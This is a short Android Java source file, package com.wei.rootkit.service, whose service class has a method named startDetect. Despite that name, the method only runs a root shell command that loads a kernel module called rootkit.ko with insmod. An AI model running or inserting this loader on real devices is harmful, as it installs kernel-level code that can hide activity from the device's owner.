package com.wei.rootkit.service;

import android.content.Context;

import java.io.FileOutputStream;
import java.io.IOException;

/**
 * Created by gome on 2017/1/15.
 */
public class InfoService {
    private static InfoService infoService = new InfoService();

    public static InfoService getInstance() {
        return infoService;
    }

    private InfoService() {
    }

    public void startDetect(){
        insertModule();
    }

    private void insertModule(){
        Process p;
        String cmd="su -c " + "\"insmod rootkit.ko\"";

        try {
            // 执行命令
            p = Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

}
